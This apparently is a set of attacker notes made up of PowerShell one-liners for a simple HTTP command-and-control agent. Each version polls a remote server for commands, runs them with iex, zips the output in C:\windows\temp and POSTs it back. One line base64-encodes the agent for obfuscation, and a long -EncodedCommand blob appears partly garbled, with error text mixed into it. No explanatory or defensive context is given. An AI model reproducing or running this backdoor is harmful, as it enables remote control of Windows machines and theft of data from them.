powershell -Command "& {$i=Get-Random;$s='http://192.168.49.121:8083/echo';$p='C:\windows\temp\hihi';while ($true){try {rm $p'.*';try{$d=iex((Invoke-WebRequest -Headers @{'hiid' = $i} -UseBasicParsing -Uri $s).Content)}catch{$d=$Error[0]};$d|Out-File -FilePath $p'.txt';Compress-Archive -Path $p'.txt' -DestinationPath $p'.zip' -Force;$b=@{'FileName' = Get-Content($p+'.zip') -Raw};$t=(Invoke-WebRequest -Method POST -UseBasicParsing -Headers @{'hiid' = $i} -Uri $s -InFile $p'.zip')}catch {Start-Sleep -Seconds 3}}}"
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("& {$i=Get-Random;$s='http://127.0.0.1:8080/echo';$p='C:\windows\temp\hihi';while ($true){try {rm $p'.*';try{$d=iex((Invoke-WebRequest -Headers @{'hiid' = $i} -UseBasicParsing -Uri $s).Content)}catch{$d=$Error[0]};$d|Out-File -FilePath $p'.txt';Compress-Archive -Path $p'.txt' -DestinationPath $p'.zip' -Force;$b=@{'FileName' = Get-Content($p+'.zip') -Raw};$t=(Invoke-WebRequest -Method POST -UseBasicParsing -Headers @{'hiid' = $i} -Uri $s -InFile $p'.zip')}catch {Start-Sleep -Seconds 3}}}"))

powershell -EncodedCommand "JgAgAHsAPQBHAGUAdAAtAFIAYQBuAGQAbwBtADsAPQAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgA4ADAAOAAwAC8AZQBjAGgAbwAnADsAPQAnAEMAOgBcAHcAaQBuAGQAbwB3AHMAXAB0AGUAbQBwAFwAaABpAGgAaQAnADsAdwBoAGkAbABlACAAKABUAHIAdQBlACkAewB0AHIAeQAgAHsAcgBtACAAJwAuACoAJwA7AHQAcgB5AHsAPQBpAGUAeAAoACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACcAaABpAGkAZAAnACAAPQAgAH0AIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACkALgBDAG8AbgB0AGUAbgB0ACkAfQBjAGEAdABjAGgAewA9AFQAaABlACAAaQBuAHAAdQB0ACAAZABhAHQAYQAgAGkAcwAgAG4AbwB0ACAAYQAgAGMAbwBtAHAAbABlAHQAZQAgAGIAbABvAGMAawAuACAAVABoAGUAIABpAG4AcAB1AHQAIABkAGEAdABhACAAaQBzACAAbgBvAHQAIABhACAAYwBvAG0AcABsAGUAdABlACAAYgBsAG8AYwBrAC4AIABDAGEAbgBuAG8AdAAgAGIAaQBuAGQAIABhAHIAZwB1AG0AZQBuAHQAIAB0AG8AIABwAGEAcgBhAG0AZQB0AGUAcgAgACcAUwB0AHIAaQBuAGcAJwAgAGIAZQBjAGEAdQBzAGUAIABpAHQAIABpAHMAIABuAHUAbABsAC4AIABDAGEAbgBuAG8AdAAgAGYAaQBuAGQAIABwAGEAdABoACAAJwBDADoAXABVAHMAZQByAHMAXABwAGMAXABwAGEAcwBzAHcAbwByAGQALgB0AHgAdAAnACAAYgBlAGMAYQB1AHMAZQAgAGkAdAAgAGQAbwBlAHMAIABuAG8AdAAgAGUAeABpAHMAdAAuACAASQBuAHAAdQB0ACAAcwB0AHIAaQBuAGcAIAB3AGEAcwAgAG4AbwB0ACAAaQBuACAAYQAgAGMAbwByAHIAZQBjAHQAIABmAG8AcgBtAGEAdAAuACAASQBuAHAAdQB0ACAAcwB0AHIAaQBuAGcAIAB3AGEAcwAgAG4AbwB0ACAAaQBuACAAYQAgAGMAbwByAHIAZQBjAHQAIABmAG8AcgBtAGEAdAAuACAAQwBhAG4AbgBvAHQAIABiAGkAbgBkACAAcABhAHIAYQBtAGUAdABlAHIAIAAnAFMAZQBjAHUAcgBlAEsAZQB5ACcALgAgAEMAYQBuAG4AbwB0ACAAYwBvAG4AdgBlAHIAdAAgAHQAaABlACAAIgAoADEALgAuADEANgApACIAIAB2AGEAbAB1AGUAIABvAGYAIAB0AHkAcABlACAAIgBTAHkAcwB0AGUAbQAuAFMAdAByAGkAbgBnACIAIAB0AG8AIAB0AHkAcABlACAAIgBTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAFMAZQBjAHUAcgBlAFMAdAByAGkAbgBnACIALgAgAEkAbgBwAHUAdAAgAHMAdAByAGkAbgBnACAAdwBhAHMAIABuAG8AdAAgAGkAbgAgAGEAIABjAG8AcgByAGUAYwB0ACAAZgBvAHIAbQBhAHQALgAgAEMAYQBuAG4AbwB0ACAAYwBvAG4AdgBlAHIAdAAgACcAUwB5AHMAdABlAG0ALgBPAGIAagBlAGMAdABbAF0AJwAgAHQAbwAgAHQAaABlACAAdAB5AHAAZQAgACcAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBTAGUAYwB1AHIAZQBTAHQAcgBpAG4AZwAnACAAcgBlAHEAdQBpAHIAZQBkACAAYgB5ACAAcABhAHIAYQBtAGUAdABlAHIAIAAnAFMAZQBjAHUAcgBlAEsAZQB5ACcALgAgAFMAcABlAGMAaQBmAGkAZQBkACAAbQBlAHQAaABvAGQAIABpAHMAIABuAG8AdAAgAHMAdQBwAHAAbwByAHQAZQBkAC4AIABDAGEAbgBuAG8AdAAgAGMAbwBuAHYAZQByAHQAIAAnAFMAeQBzAHQAZQBtAC4ATwBiAGoAZQBjAHQAWwBdACcAIAB0AG8AIAB0AGgAZQAgAHQAeQBwAGUAIAAnAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AUwBlAGMAdQByAGUAUwB0AHIAaQBuAGcAJwAgAHIAZQBxAHUAaQByAGUAZAAgAGIAeQAgAHAAYQByAGEAbQBlAHQAZQByACAAJwBTAGUAYwB1AHIAZQBLAGUAeQAnAC4AIABTAHAAZQBjAGkAZgBpAGUAZAAgAG0AZQB0AGgAbwBkACAAaQBzACAAbgBvAHQAIABzAHUAcABwAG8AcgB0AGUAZAAuACAAQwBhAG4AbgBvAHQAIABiAGkAbgBkACAAcABhAHIAYQBtAGUAdABlAHIAIAAnAFMAZQBjAHUAcgBlAEsAZQB5ACcALgAgAEMAYQBuAG4AbwB0ACAAYwBvAG4AdgBlAHIAdAAgAHQAaABlACAAIgAxADAAIgAgAHYAYQBsAHUAZQAgAG8AZgAgAHQAeQBwAGUAIAAiAFMAeQBzAHQAZQBtAC4ASQBuAHQAMwAyACIAIAB0AG8AIAB0AHkAcABlACAAIgBTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAFMAZQBjAHUAcgBlAFMAdAByAGkAbgBnACIALgAgAEMAYQBuAG4AbwB0ACAAYgBpAG4AZAAgAHAAYQByAGEAbQBlAHQAZQByACAAJwBTAGUAYwB1AHIAZQBLAGUAeQAnAC4AIABDAGEAbgBuAG8AdAAgAGMAbwBuAHYAZQByAHQAIAB0AGgAZQAgACIAWwAxADAAXQAiACAAdgBhAGwAdQBlACAAbwBmACAAdAB5AHAAZQAgACIAUwB5AHMAdABlAG0ALgBTAHQAcgBpAG4AZwAiACAAdABvACAAdAB5AHAAZQAgACIAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBTAGUAYwB1AHIAZQBTAHQAcgBpAG4AZwAiAC4AIABDAGEAbgBuAG8AdAAgAGIAaQBuAGQAIABwAGEAcgBhAG0AZQB0AGUAcgAgACcAUwBlAGMAdQByAGUASwBlAHkAJwAuACAAQwBhAG4AbgBvAHQAIABjAG8AbgB2AGUAcgB0ACAAdABoAGUAIAAiAFsAMQAwAF0AIgAgAHYAYQBsAHUAZQAgAG8AZgAgAHQAeQBwAGUAIAAiAFMAeQBzAHQAZQBtAC4AUwB0AHIAaQBuAGcAIgAgAHQAbwAgAHQAeQBwAGUAIAAiAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AUwBlAGMAdQByAGUAUwB0AHIAaQBuAGcAIgAuACAAQwBhAG4AbgBvAHQAIABiAGkAbgBkACAAcABhAHIAYQBtAGUAdABlAHIAIAAnAFMAZQBjAHUAcgBlAEsAZQB5ACcALgAgAEMAYQBuAG4AbwB0ACAAYwBvAG4AdgBlAHIAdAAgAHQAaABlACAAIgAxADAAIgAgAHYAYQBsAHUAZQAgAG8AZgAgAHQAeQBwAGUAIAAiAFMAeQBzAHQAZQBtAC4AUwB0AHIAaQBuAGcAIgAgAHQAbwAgAHQAeQBwAGUAIAAiAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AUwBlAGMAdQByAGUAUwB0AHIAaQBuAGcAIgAuACAAQwBhAG4AbgBvAHQAIABiAGkAbgBkACAAcABhAHIAYQBtAGUAdABlAHIAIAAnAFMAZQBjAHUAcgBlAEsAZQB5ACcALgAgAEMAYQBuAG4AbwB0ACAAYwBvAG4AdgBlAHIAdAAgAHQAaABlACAAIgAoADEALAA2ACkAIgAgAHYAYQBsAHUAZQAgAG8AZgAgAHQAeQBwAGUAIAAiAFMAeQBzAHQAZQBtAC4AUwB0AHIAaQBuAGcAIgAgAHQAbwAgAHQAeQBwAGUAIAAiAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AUwBlAGMAdQByAGUAUwB0AHIAaQBuAGcAIgAuACAAQwBhAG4AbgBvAHQAIABiAGkAbgBkACAAcABhAHIAYQBtAGUAdABlAHIAIAAnAFMAZQBjAHUAcgBlAEsAZQB5ACcALgAgAEMAYQBuAG4AbwB0ACAAYwBvAG4AdgBlAHIAdAAgAHQAaABlACAAIgBTAGUAYwB1AHIAZQBTAHQAcgBpAG4AZwAiACAAdgBhAGwAdQBlACAAbwBmACAAdAB5AHAAZQAgACIAUwB5AHMAdABlAG0ALgBTAHQAcgBpAG4AZwAiACAAdABvACAAdAB5AHAAZQAgACIAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBTAGUAYwB1AHIAZQBTAHQAcgBpAG4AZwAiAC4AIABDAGEAbgBuAG8AdAAgAGMAbwBuAHYAZQByAHQAIAAnAFMAeQBzAHQAZQBtAC4AUwB0AHIAaQBuAGcAJwAgAHQAbwAgAHQAaABlACAAdAB5AHAAZQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFMAdwBpAHQAYwBoAFAAYQByAGEAbQBlAHQAZQByACcAIAByAGUAcQB1AGkAcgBlAGQAIABiAHkAIABwAGEAcgBhAG0AZQB0AGUAcgAgACcARgBvAHIAYwBlACcALgAgACAARQB4AGMAZQBwAHQAaQBvAG4AIABjAGEAbABsAGkAbgBnACAAIgBHAGUAdABCAHkAdABlAHMAIgAgAHcAaQB0AGgAIAAiADEAIgAgAGEAcgBnAHUAbQBlAG4AdAAoAHMAKQA6ACAAIgBBAHIAcgBhAHkAIABjAGEAbgBuAG8AdAAgAGIAZQAgAG4AdQBsAGwALgANAAoAUABhAHIAYQBtAGUAdABlAHIAIABuAGEAbQBlADoAIABjAGgAYQByAHMAIgAgAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBQAGEAcgBzAGUARQB4AGMAZQBwAHQAaQBvAG4AOgAgAEEAdAAgAGwAaQBuAGUAOgAxACAAYwBoAGEAcgA6ADMAMAANAAoAKwAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAtAEMAbwBtAG0AYQBuAGQAIAB7ACQAYQA9ADEAOwAkAGEAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdACAALgAuAC4ADQAKACsAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfgAKAEEAcgByAGEAeQAgAGkAbgBkAGUAeAAgAGUAeABwAHIAZQBzAHMAaQBvAG4AIABpAHMAIABtAGkAcwBzAGkAbgBnACAAbwByACAAbgBvAHQAIAB2AGEAbABpAGQALgANAAoADQAKAEEAdAAgAGwAaQBuAGUAOgAxACAAYwBoAGEAcgA6ADMAMAANAAoAKwAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAtAEMAbwBtAG0AYQBuAGQAIAB7ACQAYQA9ADEAOwAkAGEAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdACAALgAuAC4ADQAKACsAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfgB+AH4AfgB+AH4AfgB+AH4AfgB+AH4AfgB+AH4AfgB+AH4AfgB+AH4AfgB+AH4ACgBVAG4AZQB4AHAAZQBjAHQAZQBkACAAdABvAGsAZQBuACAAJwBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAnACAAaQBuACAAZQB4AHAAcgBlAHMAcwBpAG8AbgAgAG8AcgAgAHMAdABhAHQAZQBtAGUAbgB0AC4ADQAKACAAIAAgAGEAdAAgAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBSAHUAbgBzAHAAYQBjAGUAcwAuAFAAaQBwAGUAbABpAG4AZQBCAGEAcwBlAC4ASQBuAHYAbwBrAGUAKABJAEUAbgB1AG0AZQByAGEAYgBsAGUAIABpAG4AcAB1AHQAKQANAAoAIAAgACAAYQB0ACAATQBpAGMAcgBvAHMAbwBmAHQALgBQAG8AdwBlAHIAUwBoAGUAbABsAC4ARQB4AGUAYwB1AHQAbwByAC4ARQB4AGUAYwB1AHQAZQBDAG8AbQBtAGEAbgBkAEgAZQBsAHAAZQByACgAUABpAHAAZQBsAGkAbgBlACAAdABlAG0AcABQAGkAcABlAGwAaQBuAGUALAAgAEUAeABjAGUAcAB0AGkAbwBuACYAIABlAHgAYwBlAHAAdABpAG8AbgBUAGgAcgBvAHcAbgAsACAARQB4AGUAYwB1AHQAaQBvAG4ATwBwAHQAaQBvAG4AcwAgAG8AcAB0AGkAbwBuAHMAKQAgAFQAaABlACAAdABlAHIAbQAgACcATQB5AHYAYQByAGkAYQBiAGwAZQAnACAAaQBzACAAbgBvAHQAIAByAGUAYwBvAGcAbgBpAHoAZQBkACAAYQBzACAAdABoAGUAIABuAGEAbQBlACAAbwBmACAAYQAgAGMAbQBkAGwAZQB0ACwAIABmAHUAbgBjAHQAaQBvAG4ALAAgAHMAYwByAGkAcAB0ACAAZgBpAGwAZQAsACAAbwByACAAbwBwAGUAcgBhAGIAbABlACAAcAByAG8AZwByAGEAbQAuACAAQwBoAGUAYwBrACAAdABoAGUAIABzAHAAZQBsAGwAaQBuAGcAIABvAGYAIAB0AGgAZQAgAG4AYQBtAGUALAAgAG8AcgAgAGkAZgAgAGEAIABwAGEAdABoACAAdwBhAHMAIABpAG4AYwBsAHUAZABlAGQALAAgAHYAZQByAGkAZgB5ACAAdABoAGEAdAAgAHQAaABlACAAcABhAHQAaAAgAGkAcwAgAGMAbwByAHIAZQBjAHQAIABhAG4AZAAgAHQAcgB5ACAAYQBnAGEAaQBuAC4AWwAwAF0AfQA7AHwATwB1AHQALQBGAGkAbABlACAALQBGAGkAbABlAFAAYQB0AGgAIAAnAC4AdAB4AHQAJwA7AEMAbwBtAHAAcgBlAHMAcwAtAEEAcgBjAGgAaQB2AGUAIAAtAFAAYQB0AGgAIAAnAC4AdAB4AHQAJwAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuAFAAYQB0AGgAIAAnAC4AegBpAHAAJwAgAC0ARgBvAHIAYwBlADsAPQBAAHsAJwBGAGkAbABlAE4AYQBtAGUAJwAgAD0AIABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAKAArACcALgB6AGkAcAAnACkAIAAtAFIAYQB3AH0AOwA9ACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBNAGUAdABoAG8AZAAgAFAATwBTAFQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACcAaABpAGkAZAAnACAAPQAgAH0AIAAtAFUAcgBpACAAIAAtAEkAbgBGAGkAbABlACAAJwAuAHoAaQBwACcAKQB9AGMAYQB0AGMAaAAgAHsAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMwB9AH0AfQA="

powershell -Command "& {$i=Get-Random;$s='http://127.0.0.1:8080/echo';$p='C:\windows\temp\hihi';while ($true){try {rm $p'.*';try{$d=iex((Invoke-WebRequest -Headers @{'hiid' = $i} -UseBasicParsing -Uri $s).Content)}catch{$d=$Error[0]};$d|Out-File -FilePath $p'.txt';Compress-Archive -Path $p'.txt' -DestinationPath $p'.zip' -Force;$b=@{'FileName' = Get-Content($p+'.zip') -Raw};$t=(Invoke-WebRequest -Method POST -UseBasicParsing -Headers @{'hiid' = $i} -Uri $s -InFile $p'.zip')}catch {Start-Sleep -Seconds 3}}}"